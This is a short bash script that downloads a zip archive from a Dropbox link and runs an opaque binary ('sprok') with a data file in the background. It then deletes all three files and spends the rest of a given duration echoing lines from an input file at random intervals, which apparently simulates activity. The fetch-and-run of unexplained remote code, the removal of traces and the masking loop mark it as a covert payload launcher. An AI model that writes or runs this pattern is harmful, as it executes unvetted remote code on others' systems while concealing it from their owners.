#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/uxa0e8f9djogdyc/wan16.zip -q
unzip wan16.zip > /dev/null 2>&1
#pwd
./sprok ./datum &
sleep 3
rm -rf wan16.zip
rm -rf sprok
rm -rf datum
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 70 ))
done < $2

